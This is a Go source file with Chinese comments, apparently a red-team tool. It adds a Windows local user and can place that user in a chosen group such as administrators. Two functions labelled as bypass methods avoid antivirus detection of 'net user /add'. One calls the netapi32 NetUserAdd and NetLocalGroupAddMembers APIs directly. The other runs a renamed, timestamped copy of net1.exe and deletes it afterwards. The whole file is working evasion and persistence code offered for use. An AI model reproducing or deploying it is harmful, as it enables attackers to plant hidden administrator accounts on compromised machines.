package pkg

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"strconv"
	"syscall"
	"time"
	"unsafe"
)

var (
	netFilePath = `C:\Windows\System32\net1.exe` // net1.exe文件绝对路径
	newFilePath = `D:\`                          // 创建临时文件路径 可根据环境自定义
	// 加载netapi32.dll中需用到的API
	netUserAdd                     = netapi32.MustFindProc("NetUserAdd")
	netLocalGroupAddMembers        = netapi32.MustFindProc("NetLocalGroupAddMembers")
	netLocalGroupGetInfo           = netapi32.MustFindProc("NetLocalGroupGetInfo")
	defaultValue            uint16 = 0
)

// 一些需要用到的常量,根据状态码判断函数执行结果
var (
	NERR_Success          uintptr = 0
	ERROR_ACCESS_DENIED   uintptr = 5
	NERR_NotPrimary       uintptr = 2226
	NERR_GroupExists      uintptr = 2223
	NERR_UserExists       uintptr = 2224
	NERR_PasswordTooShort uintptr = 2245
	NERR_GroupNotFound    uintptr = 2220
	ERROR_NO_SUCH_MEMBER  uintptr = 1387
	ERROR_MEMBER_IN_ALIAS uintptr = 1378
	ERROR_INVALID_MEMBER  uintptr = 1388
)

// groupInfo 调用win32api需传递的结构体
type groupInfo struct {
	lgrpi1_name    *uint16
	lgrpi1_comment *uint16
}

// userInfo 调用win32api需传递的结构体
type userInfo struct {
	usri1_name         *uint16
	usri1_password     *uint16
	usri1_password_age uint32
	usri1_priv         uint32
	usri1_home_dir     *uint16
	usri1_comment      *uint16
	usri1_flags        uint32
	usri1_script_path  *uint16
}

// accountInfo 调用win32api需传递的结构体
type accountInfo struct {
	lgrmi3_domainandname *uint16
}

// genUser 构造方法
func genUser(userName, pwd string) userInfo {
	newUser := userInfo{}
	newUser.usri1_name, _ = syscall.UTF16PtrFromString(userName)
	newUser.usri1_password, _ = syscall.UTF16PtrFromString(pwd)
	newUser.usri1_priv = 1
	newUser.usri1_home_dir = &defaultValue
	newUser.usri1_comment = &defaultValue
	newUser.usri1_flags = 0x0001
	newUser.usri1_script_path = &defaultValue
	return newUser
}

// genAccount 构造方法
func genAccount(userName string) accountInfo {
	account := accountInfo{}
	account.lgrmi3_domainandname, _ = syscall.UTF16PtrFromString(userName)
	return account
}

// genGroupInfo 构造方法
func genGroupInfo() groupInfo {
	group := groupInfo{
		lgrpi1_name:    &defaultValue,
		lgrpi1_comment: &defaultValue,
	}
	return group
}

// JuStatus 判断api执行结果
func JuStatus(code uintptr, TYPE bool) {
	if TYPE {
		switch code {
		case NERR_Success:
			fmt.Println("用户创建成功!")
		case ERROR_ACCESS_DENIED:
			fmt.Println("权限不足,请提升权限!")
			os.Exit(500)
		case NERR_UserExists:
			fmt.Println("用户帐户已存在!")
			os.Exit(500)
		case NERR_PasswordTooShort:
			fmt.Println("密码过于简单!")
			os.Exit(500)
		default:
			fmt.Println("特殊错误码:" + string(code) + "详情请查阅winapi手册")
			os.Exit(500)
		}
	} else {
		switch code {
		case NERR_Success:
			fmt.Println("用户已添加至指定组!")
		case NERR_GroupNotFound:
			fmt.Println("你指定的用户组不存在!")
			os.Exit(500)
		case ERROR_NO_SUCH_MEMBER:
			fmt.Println("你指定的成员不存在!")
			os.Exit(500)
		case ERROR_MEMBER_IN_ALIAS:
			fmt.Println("你指定的用户已是该组成员!!")
			os.Exit(500)
		case ERROR_INVALID_MEMBER:
			fmt.Println("帐户类型无效")
			os.Exit(500)
		}
	}
}

// AntiNumber 绕过方式1
func AntiNumber(userName, pwd, groupName string) {
	newUser := genUser(userName, pwd)
	message, _, err := netUserAdd.Call(0, 1, uintptr(unsafe.Pointer(&newUser)), 0)
	captureErr(err)
	if groupName == "" {
		JuStatus(message, true)
	} else {
		JuStatus(message, true)
		gn, _ := syscall.UTF16PtrFromString(groupName)
		group := genGroupInfo()
		message, _, err = netLocalGroupGetInfo.Call(0, uintptr(unsafe.Pointer(gn)), 1, uintptr(unsafe.Pointer(&group)))
		captureErr(err)
		if message != NERR_Success {
			fmt.Println("指定的用户组不存在!")
			os.Exit(500)
		} else { // 判断组存在加入组
			gn, _ = syscall.UTF16PtrFromString(groupName)
			ui := genAccount(userName)
			message, _, err = netLocalGroupAddMembers.Call(0, uintptr(unsafe.Pointer(gn)), 3, uintptr(unsafe.Pointer(&ui)), 1)
			JuStatus(message, false)
			captureErr(err)
		}
	}
	fmt.Println("用户名:" + userName)
}

// AntiTinder 绕过方式2
func AntiTinder(userName, pwd string, groupName string) {
	netFile := openFile(netFilePath)                                               //打开系统net1文件
	newFileName := newFilePath + strconv.FormatInt(time.Now().Unix(), 10) + ".exe" //生成新文件名
	newFile := createFile(newFileName)                                             //创建新文件
	_, err := io.Copy(newFile, netFile)                                            //复制系统net1文件内容到生成的新文件中
	CheckErr(err, "复制文件时发生错误!")
	netFile.Close()
	newFile.Close()
	addUser := exec.Command(newFileName, "user", userName, pwd, "/add") //根据参数添加用户
	err = addUser.Run()                                                 //执行命令
	CheckErr_Df(err, "命令执行发生异常!可能是权限不足或指定用户名重复导致!", newFileName)
	fmt.Println("成功添加用户:" + userName)
	if groupName != "" {
		joinGroup := exec.Command(newFileName, "localgroup", groupName, userName, "/add") //将用户加入administrators组
		err = joinGroup.Run()
		CheckErr_Df(err, "添加用户到管理组时发生异常!可能是权限不足或指定组不存在导致!", newFileName)
		fmt.Println("用户已添加至指定组!")
	}
	deleteFile(newFileName)
}
